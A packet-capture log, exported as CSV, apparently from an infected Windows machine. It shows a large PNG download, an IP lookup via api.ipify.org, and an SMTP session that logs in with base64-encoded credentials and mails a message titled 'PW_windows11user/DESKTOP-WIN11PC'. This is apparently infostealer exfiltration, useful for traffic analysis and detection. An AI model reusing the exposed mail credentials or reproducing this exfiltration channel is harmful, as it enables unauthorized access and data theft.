"No.","Time","Source","Destination","Protocol","Length","Info"
"511","1.082417","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=551690 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"512","1.082849","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=552766 Win=64240 Len=0"
"513","1.089490","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=552766 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"514","1.089500","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=554226 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"515","1.089503","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=555686 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"516","1.089505","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=557146 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"517","1.089507","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=558606 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"518","1.089509","45.56.99.101","192.168.1.27","TCP","938","80  >  51952 [PSH, ACK] Seq=560066 Ack=77 Win=64240 Len=884 [TCP PDU reassembled in 616]"
"519","1.089950","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=560950 Win=64240 Len=0"
"520","1.104546","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=560950 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"521","1.104552","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=562410 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"522","1.104554","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=563870 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"523","1.104555","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=565330 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"524","1.104905","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=566406 Win=64240 Len=0"
"525","1.105286","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=566406 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"526","1.105292","45.56.99.101","192.168.1.27","TCP","1322","80  >  51952 [PSH, ACK] Seq=567866 Ack=77 Win=64240 Len=1268 [TCP PDU reassembled in 616]"
"527","1.105567","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=569134 Win=64240 Len=0"
"528","1.111163","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=569134 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"529","1.111167","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=570594 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"530","1.111169","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=572054 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"531","1.111170","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=573514 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"532","1.111380","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=574590 Win=64240 Len=0"
"533","1.112230","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=574590 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"534","1.112235","45.56.99.101","192.168.1.27","TCP","1322","80  >  51952 [PSH, ACK] Seq=576050 Ack=77 Win=64240 Len=1268 [TCP PDU reassembled in 616]"
"535","1.112404","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=577318 Win=64240 Len=0"
"536","1.127294","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=577318 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"537","1.127300","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=578778 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"538","1.127301","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=580238 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"539","1.127302","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=581698 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"540","1.127573","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=582774 Win=64240 Len=0"
"541","1.128245","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=582774 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"542","1.128248","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=584234 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"543","1.128263","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=585694 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"544","1.128269","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=587154 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"545","1.128518","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=588230 Win=64240 Len=0"
"546","1.134325","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=588230 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"547","1.134336","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=589690 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"548","1.134338","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=591150 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"549","1.134341","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=592610 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"550","1.134343","45.56.99.101","192.168.1.27","TCP","1034","80  >  51952 [PSH, ACK] Seq=594070 Ack=77 Win=64240 Len=980 [TCP PDU reassembled in 616]"
"551","1.135060","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=595050 Win=64240 Len=0"
"552","1.135346","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=595050 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"553","1.135356","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=596510 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"554","1.135359","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=597970 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"555","1.135362","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=599430 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"556","1.135774","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=600506 Win=64240 Len=0"
"557","1.136662","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=600506 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"558","1.136670","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=601966 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"559","1.136672","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=603426 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"560","1.136673","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=604886 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"561","1.136683","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=606346 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"562","1.136685","45.56.99.101","192.168.1.27","TCP","938","80  >  51952 [PSH, ACK] Seq=607806 Ack=77 Win=64240 Len=884 [TCP PDU reassembled in 616]"
"563","1.137102","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=608690 Win=64240 Len=0"
"564","1.139512","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=608690 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"565","1.139518","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=610150 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"566","1.139520","45.56.99.101","192.168.1.27","TCP","1226","80  >  51952 [PSH, ACK] Seq=611610 Ack=77 Win=64240 Len=1172 [TCP PDU reassembled in 616]"
"567","1.139953","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=612782 Win=64240 Len=0"
"568","1.140359","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=612782 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"569","1.140363","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=614242 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"570","1.140364","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=615702 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"571","1.140374","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=617162 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"572","1.140380","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=618622 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"573","1.140381","45.56.99.101","192.168.1.27","TCP","938","80  >  51952 [PSH, ACK] Seq=620082 Ack=77 Win=64240 Len=884 [TCP PDU reassembled in 616]"
"574","1.140675","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=620966 Win=64240 Len=0"
"575","1.154908","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=620966 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"576","1.154921","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=622426 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"577","1.154923","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=623886 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"578","1.154926","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=625346 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"579","1.155472","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=626422 Win=64240 Len=0"
"580","1.161145","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=626422 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"581","1.161151","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=627882 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"582","1.161152","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=629342 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"583","1.161153","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=630802 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"584","1.161154","45.56.99.101","192.168.1.27","TCP","1034","80  >  51952 [PSH, ACK] Seq=632262 Ack=77 Win=64240 Len=980 [TCP PDU reassembled in 616]"
"585","1.161508","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=633242 Win=64240 Len=0"
"586","1.162526","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=633242 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"587","1.162531","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=634702 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"588","1.162533","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=636162 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"589","1.162534","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=637622 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"590","1.162816","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=638698 Win=64240 Len=0"
"591","1.163043","45.56.99.101","192.168.1.27","TCP","1418","80  >  51952 [PSH, ACK] Seq=638698 Ack=77 Win=64240 Len=1364 [TCP PDU reassembled in 616]"
"592","1.163175","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=640062 Win=62876 Len=0"
"593","1.184538","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=640062 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"594","1.184548","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=641522 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"595","1.184550","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=642982 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"596","1.184552","45.56.99.101","192.168.1.27","TCP","1130","80  >  51952 [PSH, ACK] Seq=644442 Ack=77 Win=64240 Len=1076 [TCP PDU reassembled in 616]"
"597","1.185047","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=645518 Win=64240 Len=0"
"598","1.199317","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=645518 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"599","1.199329","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=646978 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"600","1.199332","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=648438 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"601","1.199334","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=649898 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"602","1.199365","45.56.99.101","192.168.1.27","TCP","1034","80  >  51952 [PSH, ACK] Seq=651358 Ack=77 Win=64240 Len=980 [TCP PDU reassembled in 616]"
"603","1.199971","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=652338 Win=64240 Len=0"
"604","1.206221","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=652338 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"605","1.206227","45.56.99.101","192.168.1.27","TCP","1322","80  >  51952 [PSH, ACK] Seq=653798 Ack=77 Win=64240 Len=1268 [TCP PDU reassembled in 616]"
"606","1.206474","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=655066 Win=64240 Len=0"
"607","1.208145","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=655066 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"608","1.208151","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=656526 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"609","1.208152","45.56.99.101","192.168.1.27","TCP","1226","80  >  51952 [PSH, ACK] Seq=657986 Ack=77 Win=64240 Len=1172 [TCP PDU reassembled in 616]"
"610","1.208228","45.56.99.101","192.168.1.27","TCP","1514","80  >  51952 [ACK] Seq=659158 Ack=77 Win=64240 Len=1460 [TCP PDU reassembled in 616]"
"611","1.208231","45.56.99.101","192.168.1.27","TCP","1322","80  >  51952 [PSH, ACK] Seq=660618 Ack=77 Win=64240 Len=1268 [TCP PDU reassembled in 616]"
"612","1.208403","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=661886 Win=64240 Len=0"
"613","1.209001","45.56.99.101","192.168.1.27","TCP","1418","80  >  51952 [PSH, ACK] Seq=661886 Ack=77 Win=64240 Len=1364 [TCP PDU reassembled in 616]"
"614","1.214177","45.56.99.101","192.168.1.27","TCP","1418","80  >  51952 [PSH, ACK] Seq=663250 Ack=77 Win=64240 Len=1364 [TCP PDU reassembled in 616]"
"615","1.214356","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=664614 Win=64240 Len=0"
"616","1.224920","45.56.99.101","192.168.1.27","HTTP","362","HTTP/1.1 200 OK  (image/png)"
"617","1.280212","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=664922 Win=63932 Len=0"
"618","12.492785","45.56.99.101","192.168.1.27","TCP","54","80  >  51952 [FIN, PSH, ACK] Seq=664922 Ack=77 Win=64240 Len=0"
"619","12.493016","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [ACK] Seq=77 Ack=664923 Win=63932 Len=0"
"620","23.175059","192.168.1.27","45.56.99.101","TCP","54","51952  >  80 [RST, ACK] Seq=77 Ack=664923 Win=0 Len=0"
"621","25.717907","192.168.1.27","192.168.1.1","DNS","73","Standard query 0xb0c1 A api.ipify.org"
"622","25.886407","192.168.1.1","192.168.1.27","DNS","140","Standard query response 0xb0c1 A api.ipify.org CNAME api4.ipify.org A 64.185.227.156 A 173.231.16.76 A 104.237.62.212"
"623","25.893064","192.168.1.27","64.185.227.156","TCP","66","51957  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM"
"624","25.982545","64.185.227.156","192.168.1.27","TCP","58","443  >  51957 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460"
"625","25.983032","192.168.1.27","64.185.227.156","TCP","54","51957  >  443 [ACK] Seq=1 Ack=1 Win=64240 Len=0"
"626","25.990967","192.168.1.27","64.185.227.156","TLSv1.2","229","Client Hello (SNI=api.ipify.org)"
"627","25.991151","64.185.227.156","192.168.1.27","TCP","54","443  >  51957 [ACK] Seq=1 Ack=176 Win=64240 Len=0"
"628","26.072174","64.185.227.156","192.168.1.27","TLSv1.2","1514","Server Hello"
"629","26.072184","64.185.227.156","192.168.1.27","TCP","1514","443  >  51957 [ACK] Seq=1461 Ack=176 Win=64240 Len=1460 [TCP PDU reassembled in 632]"
"630","26.072187","64.185.227.156","192.168.1.27","TCP","1514","443  >  51957 [ACK] Seq=2921 Ack=176 Win=64240 Len=1460 [TCP PDU reassembled in 632]"
"631","26.072189","64.185.227.156","192.168.1.27","TCP","826","443  >  51957 [PSH, ACK] Seq=4381 Ack=176 Win=64240 Len=772 [TCP PDU reassembled in 632]"
"632","26.072407","64.185.227.156","192.168.1.27","TLSv1.2","937","Certificate, Server Key Exchange, Server Hello Done"
"633","26.073074","192.168.1.27","64.185.227.156","TCP","54","51957  >  443 [ACK] Seq=176 Ack=6036 Win=64240 Len=0"
"634","26.077200","192.168.1.27","64.185.227.156","TLSv1.2","147","Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message"
"635","26.077367","64.185.227.156","192.168.1.27","TCP","54","443  >  51957 [ACK] Seq=6036 Ack=269 Win=64240 Len=0"
"636","26.173078","64.185.227.156","192.168.1.27","TLSv1.2","249","New Session Ticket, Change Cipher Spec, Encrypted Handshake Message"
"637","26.186521","192.168.1.27","64.185.227.156","TLSv1.2","238","Application Data"
"638","26.186704","64.185.227.156","192.168.1.27","TCP","54","443  >  51957 [ACK] Seq=6231 Ack=453 Win=64240 Len=0"
"639","26.280814","64.185.227.156","192.168.1.27","TLSv1.2","284","Application Data"
"640","26.326681","192.168.1.27","64.185.227.156","TCP","54","51957  >  443 [ACK] Seq=453 Ack=6461 Win=63815 Len=0"
"641","29.124055","192.168.1.27","192.168.1.1","DNS","77","Standard query 0x756b A mail.transgear.in"
"642","29.491587","192.168.1.1","192.168.1.27","DNS","107","Standard query response 0x756b A mail.transgear.in CNAME transgear.in A 204.11.58.28"
"643","29.492989","192.168.1.27","204.11.58.28","TCP","66","51958  >  587 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 WS=256 SACK_PERM"
"644","29.593890","204.11.58.28","192.168.1.27","TCP","58","587  >  51958 [SYN, ACK] Seq=0 Ack=1 Win=64240 Len=0 MSS=1460"
"645","29.594161","192.168.1.27","204.11.58.28","TCP","54","51958  >  587 [ACK] Seq=1 Ack=1 Win=64240 Len=0"
"646","30.412813","204.11.58.28","192.168.1.27","SMTP","232","S: 220-bh-41.webhostbox.net ESMTP Exim 4.95 #2 Thu, 05 Jan 2023 22:51:30 +0000  | We do not authorize the use of this system to transport unsolicited,  | and/or bulk e-mail."
"647","30.413189","192.168.1.27","204.11.58.28","SMTP","76","C: EHLO DESKTOP-WIN11PC"
"648","30.413327","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=179 Ack=23 Win=64240 Len=0"
"649","30.512841","204.11.58.28","192.168.1.27","SMTP","231","S: 250-bh-41.webhostbox.net Hello DESKTOP-WIN11PC [173.66.46.112] | SIZE 52428800 | 8BITMIME | PIPELINING | PIPE_CONNECT | AUTH PLAIN LOGIN | STARTTLS | HELP"
"650","30.514513","192.168.1.27","204.11.58.28","SMTP","99","C: AUTH login User: bWFya2V0aW5nQHRyYW5zZ2Vhci5pbg=="
"651","30.514660","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=356 Ack=68 Win=64240 Len=0"
"652","30.620821","204.11.58.28","192.168.1.27","SMTP","72","S: 334 UGFzc3dvcmQ6"
"653","30.622428","192.168.1.27","204.11.58.28","SMTP","72","C: Pass: TUBzc3cwcmQjNjIx"
"654","30.622622","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=374 Ack=86 Win=64240 Len=0"
"655","30.805037","204.11.58.28","192.168.1.27","SMTP","84","S: 235 Authentication succeeded"
"656","30.805955","192.168.1.27","204.11.58.28","SMTP","90","C: MAIL FROM:<marketing@transgear.in>"
"657","30.806450","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=404 Ack=122 Win=64240 Len=0"
"658","30.909911","204.11.58.28","192.168.1.27","SMTP","62","S: 250 OK"
"659","30.910382","192.168.1.27","204.11.58.28","SMTP","94","C: RCPT TO:<zaritkt@arhitektondizajn.com>"
"660","30.910532","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=412 Ack=162 Win=64240 Len=0"
"661","31.044757","204.11.58.28","192.168.1.27","SMTP","68","S: 250 Accepted"
"662","31.045187","192.168.1.27","204.11.58.28","SMTP","60","C: DATA"
"663","31.045426","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=426 Ack=168 Win=64240 Len=0"
"664","31.150936","204.11.58.28","192.168.1.27","SMTP","110","S: 354 Enter message, ending with ""."" on a line by itself"
"665","31.153380","192.168.1.27","204.11.58.28","SMTP","303","C: DATA fragment, 249 bytes"
"666","31.153577","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=482 Ack=417 Win=64240 Len=0"
"667","31.153587","192.168.1.27","204.11.58.28","SMTP","1077","C: DATA fragment, 1023 bytes"
"668","31.153702","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=482 Ack=1440 Win=64240 Len=0"
"669","31.153750","192.168.1.27","204.11.58.28","SMTP","669","C: DATA fragment, 615 bytes"
"670","31.153949","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=482 Ack=2055 Win=64240 Len=0"
"671","31.153954","192.168.1.27","204.11.58.28","SMTP","56","C: DATA fragment, 2 bytes"
"672","31.154068","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=482 Ack=2057 Win=64240 Len=0"
"673","31.154088","192.168.1.27","204.11.58.28","SMTP/IMF","59","from: marketing@transgear.in, subject: PW_windows11user/DESKTOP-WIN11PC,  (text/html) | ."
"674","31.154201","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=482 Ack=2062 Win=64240 Len=0"
"675","31.364008","204.11.58.28","192.168.1.27","SMTP","82","S: 250 OK id=1pDZ59-000wFk-B4"
"676","31.406138","192.168.1.27","204.11.58.28","TCP","54","51958  >  587 [ACK] Seq=2062 Ack=510 Win=63731 Len=0"
"677","36.406254","192.168.1.27","192.168.1.1","NBNS","110","Refresh NB <01><02>__MSBROWSE__<02><01>"
"678","37.920864","192.168.1.27","192.168.1.1","NBNS","110","Refresh NB <01><02>__MSBROWSE__<02><01>"
"679","39.436389","192.168.1.27","192.168.1.1","NBNS","110","Refresh NB <01><02>__MSBROWSE__<02><01>"
"680","86.278981","64.185.227.156","192.168.1.27","TLSv1.2","85","Encrypted Alert"
"681","86.279413","64.185.227.156","192.168.1.27","TCP","54","443  >  51957 [FIN, PSH, ACK] Seq=6492 Ack=453 Win=64240 Len=0"
"682","86.279579","192.168.1.27","64.185.227.156","TCP","54","51957  >  443 [ACK] Seq=453 Ack=6493 Win=63784 Len=0"
"683","90.855162","HewlettPacka_22:74:fb","TpLinkTechno_37:9b:f6","ARP","42","Who has 192.168.1.1? Tell 192.168.1.27"
"684","90.855272","TpLinkTechno_37:9b:f6","HewlettPacka_22:74:fb","ARP","42","192.168.1.1 is at 00:14:78:37:9b:f6"
"685","126.297045","192.168.1.27","64.185.227.156","TCP","54","51957  >  443 [RST, ACK] Seq=453 Ack=6493 Win=0 Len=0"
"686","129.075407","192.168.1.27","204.11.58.28","SMTP","60","C: QUIT"
"687","129.075767","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=510 Ack=2068 Win=64240 Len=0"
"688","129.788059","204.11.58.28","192.168.1.27","SMTP","99","S: 221 bh-41.webhostbox.net closing connection"
"689","129.788569","192.168.1.27","204.11.58.28","TCP","54","51958  >  587 [ACK] Seq=2068 Ack=556 Win=63686 Len=0"
"690","129.788855","192.168.1.27","204.11.58.28","TCP","54","51958  >  587 [FIN, ACK] Seq=2068 Ack=556 Win=63686 Len=0"
"691","129.789111","204.11.58.28","192.168.1.27","TCP","54","587  >  51958 [ACK] Seq=556 Ack=2069 Win=64239 Len=0"
"692","130.328607","192.168.1.27","192.168.1.1","DNS","76","Standard query 0x7e7c A wpad.localdomain"
"693","130.855277","HewlettPacka_22:74:fb","TpLinkTechno_37:9b:f6","ARP","42","Who has 192.168.1.1? Tell 192.168.1.27"
"694","130.855406","TpLinkTechno_37:9b:f6","HewlettPacka_22:74:fb","ARP","42","192.168.1.1 is at 00:14:78:37:9b:f6"
"695","131.325521","192.168.1.27","192.168.1.1","DNS","76","Standard query 0x7e7c A wpad.localdomain"
"696","133.325389","192.168.1.27","192.168.1.1","DNS","76","Standard query 0x7e7c A wpad.localdomain"
"697","147.919124","192.168.1.27","192.168.1.1","DNS","76","Standard query 0x6d34 A dns.msftncsi.com"
"698","148.117501","192.168.1.1","192.168.1.27","DNS","92","Standard query response 0x6d34 A dns.msftncsi.com A 131.107.255.255"
